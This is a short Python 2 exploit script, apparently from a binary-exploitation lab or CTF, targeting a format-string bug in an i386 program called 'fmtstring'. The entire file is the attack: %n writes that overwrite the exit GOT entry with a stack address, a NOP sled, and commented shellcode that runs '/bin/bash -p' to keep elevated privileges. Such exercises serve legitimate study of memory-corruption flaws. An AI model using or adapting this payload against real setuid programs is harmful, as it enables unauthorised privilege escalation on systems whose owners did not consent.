#!/usr/bin/python



#fmtstring:     file format elf32-i386

#DYNAMIC RELOCATION RECORDS
#OFFSET   TYPE              VALUE
# 0804b2c0 R_386_JUMP_SLOT   exit@GLIBC_2.0
w1 = '\xc0\xb2\x04\x08JUNK'
w2 = '\xc1\xb2\x04\x08JUNK'
w3 = '\xc2\xb2\x04\x08JUNK'
w4 = '\xc3\xb2\x04\x08JUNK'


# We're picking an address on the stack in this case.  The value may not be the same, so a sufficient NOP sled will increase the 'window' we have to make our mark.
b1 = 0xff
b2 = 0xce
b3 = 0xff
b4 = 0xff


n1 = 256 + b1 - 0x2f - 1
n2 = 256*2 + b2 - n1 - 0x2f - 1
n3 = 256*3 + b3 - n1 - n2 - 0x2f - 1
n4 = 256*4 + b4 - n1 - n2 - n3 - 0x2f - 1

form = '%x%x%' + str(n1) + 'x%n%' + str(n2)
form += 'x%n%' + str(n3) + 'x%n%' + str(n4) + 'x%n'


# ;;;;;;;;;;;;;;;;;;;;;;;;
# Lots of NOPS to expand the 'window' in case of stack variation
nops = "\x90" * 240

# ;;;;;;;;;;;;;;;;;;;;;;;;
# Adjust ESP to boundary
stack_adj = '\x44' * 4

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# execve("/bin/bash", ["/bin/bash", "-p"], NULL)
# 
# 6a 0b                	push   $0xb
# 58                   	pop    %eax
# 99                   	cltd   
# 52                   	push   %edx
# 66 68 2d 70          	pushw  $0x702d
# 89 e1                	mov    %esp,%ecx
# 52                   	push   %edx
# 6a 68                	push   $0x68
# 68 2f 62 61 73       	push   $0x7361622f
# 68 2f 62 69 6e       	push   $0x6e69622f
# 89 e3                	mov    %esp,%ebx
# 52                   	push   %edx
# 51                   	push   %ecx
# 53                   	push   %ebx
# 89 e1                	mov    %esp,%ecx
# cd 80                	int    $0x80

buf = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

# ;;;;;;;;;;;;;;;;;;;;;;;;;
# Padding... 
padding = 'Z' * (250 - len(buf))

print w1 + w2 + w3 + w4 + form + nops + stack_adj + buf + padding
